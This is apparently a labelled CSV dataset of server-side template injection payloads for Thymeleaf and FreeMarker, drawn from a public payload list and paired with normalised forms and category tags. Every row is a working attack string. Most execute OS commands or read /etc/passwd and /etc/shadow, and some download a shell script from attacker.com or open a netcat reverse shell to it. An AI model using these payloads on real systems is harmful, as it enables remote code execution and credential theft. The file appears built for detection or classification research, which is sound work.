${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).readLine()},${newjava.io.bufferedreader(newjava.io.inputstreamreader(t(java.lang.runtime).getruntime().exec('S').getinputstream())).readline()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).lines().toArray()},${newjava.io.bufferedreader(newjava.io.inputstreamreader(t(java.lang.runtime).getruntime().exec('S').getinputstream())).lines().toarray()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()},${newjava.io.bufferedreader(newjava.io.filereader('S')).readline()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).lines().toArray()},${newjava.io.bufferedreader(newjava.io.filereader('S')).lines().toarray()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('flag.txt')).readLine()},${newjava.io.bufferedreader(newjava.io.filereader('S')).readline()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('calc')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd /c calc')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd /c dir')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('powershell.exe')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd.exe /c whoami')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd','/c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'powershell','-c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.util.Base64).getDecoder().decode('aWQ=')},${t(java.util.baseN).getdecoder().decode('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.String(T(java.util.Base64).getDecoder().decode('aWQ='))},${newjava.lang.string(t(java.util.baseN).getdecoder().decode('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${""freemarker.template.utility.Execute""?new()(""env"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""ps aux"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""ifconfig"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""netstat -an"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cat /etc/shadow"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",""whoami"").start()}","${""S""?new()(""S"",""S"").start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/etc/passwd"")}","${""S""?new()(""S"",""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().exec(""id"")}","${""S""?new().exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().eval(""1+1"")}","${""S""?new().eval(""S"")}",java,FreeMarker,1,high,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""whoami"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""cat /etc/passwd"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ls -la"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""uname -a"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""pwd"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""env"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""cat flag.txt"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ps aux"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ifconfig"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""netstat -an"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${dwf.newInstance(ec,null)(""id"")}","${dwf.newinstance(ec,null)(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass()},${object.getclass()},java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getClassLoader()},${object.getclass().getclassloader()},java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain()},${object.getclass().getprotectiondomain()},java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain().getCodeSource()},${object.getclass().getprotectiondomain().getcodesource()},java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain().getClassLoader()},${object.getclass().getprotectiondomain().getclassloader()},java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""id"").start()}","${value(""S"",""S"").start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""whoami"").start()}","${value(""S"",""S"").start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""cat"",""/etc/passwd"").start()}","${value(""S"",""S"",""S"").start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/etc/passwd"").exists()}","${value(""S"",""S"").exists()}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/"").list()}","${value(""S"",""S"").list()}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/etc/passwd"")}","${value(""S"",""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/etc/passwd"").exists()}","${""S""?new()(""S"",""S"").exists()}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/"").list()}","${""S""?new()(""S"",""S"").list()}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/"").listFiles()}","${""S""?new()(""S"",""S"").listfiles()}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""bash"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""/bin/sh"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""/bin/bash"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(command)}","${""S""?new()(command)}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.version},${.version},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.data_model},${.data_model},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.globals},${.globals},java,FreeMarker,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.locale},${.locale},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.now},${.now},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.current_node},${.current_node},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.main},${.main},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.namespace},${.namespace},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.output_encoding},${.output_encoding},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.url_escaping_charset},${.url_escaping_charset},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.vars},${.vars},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.lang},${.lang},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${scanner.next()},${scanner.next()},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""touch /tmp/pwned"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""wget http://attacker.com/shell.sh -O /tmp/shell.sh"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""curl http://attacker.com/shell.sh -o /tmp/shell.sh"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""nc attacker.com 4444 -e /bin/bash"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${obj(""id"")}","${obj(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${runtime.exec(""id"")}","${runtime.exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${process.start()},${process.start()},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cat${IFS}/etc/passwd"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""cat</etc/passwd""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""cat<flag.txt""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cat${IFS}/etc/passwd"")}","${ex(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cat$IFS/etc/passwd"")}","${ex(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.name"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.home"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.dir"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""os.name"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""os.version"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""java.version"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""java.home"")}","${system.getproperty(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${system.getenv()},${system.getenv()},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""PATH"")}","${system.getenv(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""HOME"")}","${system.getenv(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""USER"")}","${system.getenv(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd /c calc"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd /c dir"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""powershell.exe"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd.exe /c whoami"")}","${""S""?new()(""S"")}",java,FreeMarker,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cmd /c whoami"")}","${ex(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""powershell -c whoami"")}","${ex(""S"")}",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""cmd"",""/c"",""whoami""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
